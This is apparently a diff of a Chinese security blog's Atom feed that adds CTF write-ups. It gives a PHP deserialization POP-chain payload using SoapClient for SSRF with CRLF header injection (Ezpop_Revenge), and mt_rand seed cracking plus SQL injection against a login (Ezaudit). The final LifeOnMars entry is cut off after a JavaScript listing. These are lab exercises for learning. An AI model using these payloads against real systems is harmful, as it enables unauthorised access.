@@ -81,6 +81,8 @@
     <category term="利用.htaccess构成后门" />
     <category term="通过php_value来设置preg_macth正则回溯次数" />
     <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="信息搜集（js，网络）" />
     <entry>
         <id>http://odiws.github.io/2025/02/26/HMGCTF2022-Fan-Website/</id>
         <title>[HMGCTF2022]Fan_Website</title>
@@ -351,6 +353,24 @@ exit
         <category term="buuctf" />
         <category term="http" />
         <updated>2024-12-10T06:28:24.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/12/04/MRCTF2020-Ezpop-Revenge/</id>
+        <title>[MRCTF2020]Ezpop_Revenge</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/12/04/MRCTF2020-Ezpop-Revenge/"/>
+        <content type="html">&lt;h2 id=&#34;mrctf2020ezpop_revenge&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020ezpop_revenge&#34;&gt;#&lt;/a&gt; [MRCTF2020]Ezpop_Revenge&lt;/h2&gt;
+&lt;p&gt;反序列化 pop 链：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HelloWorld_DB::wakeup–&amp;gt;Typecho_Db::__construct(tostring)–&amp;gt;Typecho_Db_Query::__construct–&amp;gt;(this-&amp;gt;_adapter=new Soapclient)–&amp;gt;SSRF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Typecho_Db_Query&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_sqlPreBuild&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_adapter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$target&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;http://127.0.0.1/flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$headers&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;X-Forwarded-For: 127.0.0.1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Cookie: PHPSESSID=rd6u7agm56jsrqqrrni0f6s1r6&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SoapClient&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;location&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;user_agent&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;HyyMbb^^&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;^^&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$headers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;uri&#39;&lt;/span&gt;      &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;aaab&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;_sqlPreBuild&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;action&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;_adapter&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;HelloWorld_DB&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$coincidence&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;coincidence&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hello&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Typecho_Db_Query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;HelloWorld_DB&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$aaa&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$aaa&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;^^&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$aaa&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;amp;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;amp;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$aaa&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;先从 flag 获取 sessionid，再直接 payload 使用 POST 方式把上面的输出放到 C0incid3nc3 变量中即可。然后在 GET 参数上再加一个 admin 变量即可出现 flag 的值。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241208154306356.png&#34; alt=&#34;image-20241208154306356&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ0FQRC9wLzE3ODM1NzE1Lmh0bWw=&#34;&gt;https://www.cnblogs.com/CAPD/p/17835715.html&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzExMTM0MjguaHRtbA==&#34;&gt;https://cn-sec.com/archives/1113428.html&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="php反序列化" />
+        <updated>2024-12-04T13:17:38.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/12/01/LineCTF2022-BB/</id>
@@ -2829,6 +2849,113 @@ cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file 
         <updated>2024-07-25T11:42:26.000Z</updated>
     </entry>
     <entry>
+        <id>http://odiws.github.io/2024/07/24/MRCTF2020-Ezaudit/</id>
+        <title>[MRCTF2020]Ezaudit</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/07/24/MRCTF2020-Ezaudit/"/>
+        <content type="html">&lt;h2 id=&#34;mrctf2020ezaudit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020ezaudit&#34;&gt;#&lt;/a&gt; [MRCTF2020]Ezaudit&lt;/h2&gt;
+&lt;p&gt;打开题目是个漂亮的前端，扫一下发现 &lt;code&gt;www.zip&lt;/code&gt;  文件泄露，下载审计&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
+header(&#39;Content-type:text/html; charset=utf-8&#39;);
+error_reporting(0);
+if(isset($_POST[&#39;login&#39;]))&amp;#123;
+    $username = $_POST[&#39;username&#39;];
+    $password = $_POST[&#39;password&#39;];
+    $Private_key = $_POST[&#39;Private_key&#39;];
+    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) &amp;#123;
+        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
+        header(&#39;refresh:2; url=login.html&#39;);
+        echo &amp;quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&amp;quot;;
+        exit;
+&amp;#125;
+    else if($Private_key != &#39;*************&#39; )
+    &amp;#123;
+        header(&#39;refresh:2; url=login.html&#39;);
+        echo &amp;quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&amp;quot;;
+        exit;
+    &amp;#125;
+
+    else&amp;#123;
+        if($Private_key === &#39;************&#39;)&amp;#123;
+        $getuser = &amp;quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&amp;quot;.&#39;;&#39;; 
+        $link=mysql_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;root&amp;quot;);
+        mysql_select_db(&amp;quot;test&amp;quot;,$link);
+        $result = mysql_query($getuser);
+        while($row=mysql_fetch_assoc($result))&amp;#123;
+            echo &amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;quot;.$row[&amp;quot;username&amp;quot;].&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot;.$row[&amp;quot;flag&amp;quot;].&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot;;
+        &amp;#125;
+    &amp;#125;
+    &amp;#125;
+
+&amp;#125; 
+// genarate public_key 
+function public_key($length = 16) &amp;#123;
+    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $public_key = &#39;&#39;;
+    for ( $i = 0; $i &amp;lt; $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+  &amp;#125;
+
+  //genarate private_key
+  function private_key($length = 12) &amp;#123;
+    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $private_key = &#39;&#39;;
+    for ( $i = 0; $i &amp;lt; $length; $i++ )
+    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+  &amp;#125;
+  $Public_key = public_key();
+  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据最后一行提示，我们需要通过公钥找到私钥，这里使用了 mt_rand () 函数，具体可以看一下链接文章讲的很详细。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;爆破 seed&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;str1=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;
+str2=&#39;KVQP0LdJKRaV3n9D&#39;
+str3 = str1[::-1]
+length = len(str2)
+res=&#39;&#39;
+for i in range(len(str2)):  
+    for j in range(len(str1)):
+        if str2[i] == str1[j]:
+            res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
+            break
+print(res)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;用 php_mt_seed 算出种子为 1775196155&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BMRCTF2020%5DEzaudit/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;算出私钥&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+mt_srand(1775196155);
+//公钥
+function public_key($length = 16) &amp;#123;
+    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $public_key = &#39;&#39;;
+    for ( $i = 0; $i &amp;lt; $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+&amp;#125;
+//私钥
+function private_key($length = 12) &amp;#123;
+	
+	$strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+	$private_key = &#39;&#39;;
+	for ( $i = 0; $i &amp;lt; $length; $i++ )
+	$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+	return $private_key;
+&amp;#125;
+echo public_key();
+echo private_key();
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;index.php 中有一个 login.html 直接访问，输入账号密码私钥登录得到 flag（万能密码）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BMRCTF2020%5DEzaudit/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;end&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="伪随机数" />
+        <updated>2024-07-24T13:26:30.000Z</updated>
+    </entry>
+    <entry>
         <id>http://odiws.github.io/2024/06/21/Again/</id>
         <title>[WMCTF2020]Make PHP Great Again</title>
         <link rel="alternate" href="http://odiws.github.io/2024/06/21/Again/"/>
@@ -2862,6 +2989,69 @@ cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file 
         <category term="buuctf" />
         <category term="条件竞争：利用session.upload_progress" />
         <updated>2024-06-21T12:48:52.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/06/20/Mars/</id>
+        <title>[b01lers2020]lifeMars</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/20/Mars/"/>
+        <content type="html">&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进来是这样的场景：用 f12 进入网络发现有些一样的传参：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现有个 search 的传参：（结合源码（ctrl+u）发现有个 life on mars 这个文件）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;life on mars.js
+
+function get_life(query) &amp;#123;
+  $.ajax(&amp;#123;
+    type: &amp;quot;GET&amp;quot;,
+    url: &amp;quot;/query?search=&amp;quot; + query,
+    data: &amp;quot;&amp;#123;&amp;#125;&amp;quot;,
+    contentType: &amp;quot;application/json; charset=utf-8&amp;quot;,
+    dataType: &amp;quot;json&amp;quot;,
+    cache: false,
+    success: function(data) &amp;#123;
+      var table_html =
+        &#39;&amp;lt;table id=&amp;quot;results&amp;quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Description&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&#39;;
+      $.each(data, function(i, item) &amp;#123;
+        table_html +=
+          &amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;quot; + data[i][0] + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot; + data[i][1] + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;
+      &amp;#125;);
+      table_html += &amp;quot;&amp;lt;/table&amp;gt;&amp;quot;;
+
+      $(&amp;quot;#results&amp;quot;).replaceWith(table_html);
+    &amp;#125;,
+
+    error: function(msg) &amp;#123; &amp;#125;
+  &amp;#125;);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
